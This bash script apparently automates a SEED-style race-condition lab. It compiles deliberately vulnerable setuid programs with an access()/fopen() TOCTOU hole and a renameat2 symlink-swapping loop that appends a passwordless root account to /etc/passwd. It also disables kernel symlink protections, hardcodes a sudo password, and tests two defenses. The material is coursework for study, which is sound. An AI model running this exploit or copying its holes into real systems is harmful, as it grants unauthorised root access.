#!/bin/bash
set -u

LAB="/home/seed/LabsetupRace"
OUT="/home/seed/hw7_results"
MAGIC="test:U6aMy0wojraho:0:0:test:/root:/bin/bash"
SUDO_PASSWORD="dees"

mkdir -p "$LAB" "$OUT"
cd "$LAB" || exit 1

printf '%s\n' "$SUDO_PASSWORD" | sudo -S -v >/dev/null 2>&1

ORIG_SYMLINKS=$(sysctl -n fs.protected_symlinks 2>/dev/null || echo 1)
ORIG_REGULAR=$(sysctl -n fs.protected_regular 2>/dev/null || echo 2)
printf 'fs.protected_symlinks=%s\nfs.protected_regular=%s\n' "$ORIG_SYMLINKS" "$ORIG_REGULAR" > "$OUT/original_sysctl.txt"

BACKUP="$LAB/passwd.hw7.backup"
sudo cp /etc/passwd "$BACKUP"

restore_system() {
  sudo cp "$BACKUP" /etc/passwd
  sudo sysctl -w "fs.protected_symlinks=$ORIG_SYMLINKS" >/dev/null 2>&1 || true
  sudo sysctl -w "fs.protected_regular=$ORIG_REGULAR" >/dev/null 2>&1 || true
  rm -f /tmp/XYZ /tmp/ABC
}
trap restore_system EXIT

cleanup_passwd() {
  sudo sed -i '/^test:/d' /etc/passwd
}

disable_protection() {
  sudo sysctl -w fs.protected_symlinks=0 >/dev/null
  sudo sysctl -w fs.protected_regular=0 >/dev/null
}

enable_builtin_scheme() {
  sudo sysctl -w fs.protected_symlinks=1 >/dev/null
  sudo sysctl -w fs.protected_regular=2 >/dev/null
}

cat > vulp_sleep.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main()
{
    char *fn = "/tmp/XYZ";
    char buffer[60];
    FILE *fp;
    scanf("%50s", buffer);
    if (!access(fn, W_OK)) {
        sleep(10);
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }
    return 0;
}
EOF

cat > vulp_nosleep.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main()
{
    char *fn = "/tmp/XYZ";
    char buffer[60];
    FILE *fp;
    scanf("%50s", buffer);
    if (!access(fn, W_OK)) {
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }
    return 0;
}
EOF

cat > vulp_privilege.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main()
{
    char *fn = "/tmp/XYZ";
    char buffer[60];
    FILE *fp;
    uid_t real_uid = getuid();
    uid_t eff_uid = geteuid();
    scanf("%50s", buffer);
    if (!access(fn, W_OK)) {
        seteuid(real_uid);
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            seteuid(eff_uid);
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
        seteuid(eff_uid);
    } else {
        printf("No permission \n");
    }
    return 0;
}
EOF

cat > switcher.c <<'EOF'
#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/fs.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
int main()
{
    unsigned int flags = RENAME_EXCHANGE;
    unlink("/tmp/XYZ");
    symlink("/dev/null", "/tmp/XYZ");
    unlink("/tmp/ABC");
    symlink("/etc/passwd", "/tmp/ABC");
    while (1) {
        syscall(SYS_renameat2, AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC", flags);
    }
    return 0;
}
EOF

cat > target_process.sh <<'EOF'
#!/bin/bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
count=0
while [ "$old" == "$new" ]
do
    printf '%s\n' 'test:U6aMy0wojraho:0:0:test:/root:/bin/bash' | ./vulp
    count=$((count + 1))
    if [ $((count % 200)) -eq 0 ]; then
        echo "Attempt $count: /etc/passwd unchanged"
    fi
    new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed after $count attempts"
tail -n 4 /etc/passwd
EOF
chmod +x target_process.sh

cp vulp_sleep.c vulp_nosleep.c vulp_privilege.c switcher.c target_process.sh "$OUT/"

{
  echo "Task 1: append the magic value and test login"
  disable_protection
  cleanup_passwd
  echo "$MAGIC" | sudo tee -a /etc/passwd >/dev/null
  echo
  echo "End of /etc/passwd:"
  tail -n 6 /etc/passwd
  echo
  echo "Login test with an empty password:"
  printf '\n' | su test -c 'whoami; id; echo "EUID=$EUID"' 2>&1
} > "$OUT/task1.txt" 2>&1

{
  echo "Task 2.A: slow-machine race using sleep(10)"
  disable_protection
  cleanup_passwd
  cp vulp_sleep.c vulp.c
  gcc vulp.c -o vulp
  sudo chown root vulp
  sudo chmod 4755 vulp
  echo "MAGIC input used by vulp:"
  echo "$MAGIC"
  echo "hello" > "$LAB/test"
  chmod 666 "$LAB/test"
  ln -sf "$LAB/test" /tmp/XYZ
  echo
  echo "BEFORE running vulp:"
  ls -ld /tmp/XYZ
  (printf '%s\n' "$MAGIC" | ./vulp) &
  VULP_PID=$!
  sleep 1
  echo
  echo "During sleep(10): relink /tmp/XYZ to /etc/passwd"
  ln -sf /etc/passwd /tmp/XYZ
  wait "$VULP_PID"
  echo
  echo "AFTER running vulp:"
  ls -ld /tmp/XYZ
  echo
  echo "End of /etc/passwd after attack:"
  tail -n 5 /etc/passwd
} > "$OUT/task2a.txt" 2>&1

run_race_for_seconds() {
  local seconds="$1"
  local logfile="$2"
  rm -f /tmp/XYZ /tmp/ABC
  ./target_process.sh > "$logfile" 2>&1 &
  local target_pid=$!
  ./switcher >/dev/null 2>&1 &
  local switcher_pid=$!
  local elapsed=0
  while kill -0 "$target_pid" >/dev/null 2>&1; do
    if [ "$elapsed" -ge "$seconds" ]; then
      break
    fi
    sleep 1
    elapsed=$((elapsed + 1))
  done
  if kill -0 "$target_pid" >/dev/null 2>&1; then
    echo "TIMEOUT after ${seconds}s: /etc/passwd was not changed" >> "$logfile"
    kill "$target_pid" >/dev/null 2>&1 || true
  fi
  kill "$switcher_pid" >/dev/null 2>&1 || true
  wait "$target_pid" >/dev/null 2>&1 || true
  wait "$switcher_pid" >/dev/null 2>&1 || true
}

{
  echo "Task 2.C: improved race using renameat2(RENAME_EXCHANGE)"
  disable_protection
  cleanup_passwd
  cp vulp_nosleep.c vulp.c
  gcc vulp.c -o vulp
  sudo chown root vulp
  sudo chmod 4755 vulp
  gcc switcher.c -o switcher
  run_race_for_seconds 30 "$OUT/task2c.full.log"
  echo "Last part of target_process.sh output:"
  tail -n 35 "$OUT/task2c.full.log"
  echo
  echo "Current /etc/passwd status:"
  tail -n 5 /etc/passwd
} > "$OUT/task2c.txt" 2>&1

{
  echo "Task 3.A: least-privilege defense with seteuid(real_uid) before fopen"
  disable_protection
  cleanup_passwd
  cp vulp_privilege.c vulp.c
  gcc vulp.c -o vulp
  sudo chown root vulp
  sudo chmod 4755 vulp
  gcc switcher.c -o switcher
  run_race_for_seconds 8 "$OUT/task3a.full.log"
  echo "Last part of target_process.sh output:"
  tail -n 35 "$OUT/task3a.full.log"
  echo
  echo "No test account should be appended:"
  tail -n 5 /etc/passwd
} > "$OUT/task3a.txt" 2>&1

{
  echo "Task 3.B: Ubuntu built-in symlink protection"
  enable_builtin_scheme
  cleanup_passwd
  cp vulp_nosleep.c vulp.c
  gcc vulp.c -o vulp
  sudo chown root vulp
  sudo chmod 4755 vulp
  gcc switcher.c -o switcher
  echo "Protection values:"
  /sbin/sysctl fs.protected_symlinks
  /sbin/sysctl fs.protected_regular
  run_race_for_seconds 8 "$OUT/task3b.full.log"
  echo
  echo "Last part of target_process.sh output:"
  tail -n 35 "$OUT/task3b.full.log"
  echo
  echo "No test account should be appended:"
  tail -n 5 /etc/passwd
} > "$OUT/task3b.txt" 2>&1

{
  echo "Generated files:"
  ls -l "$OUT"
  echo
  echo "Restoration will run via EXIT trap."
} > "$OUT/summary.txt" 2>&1
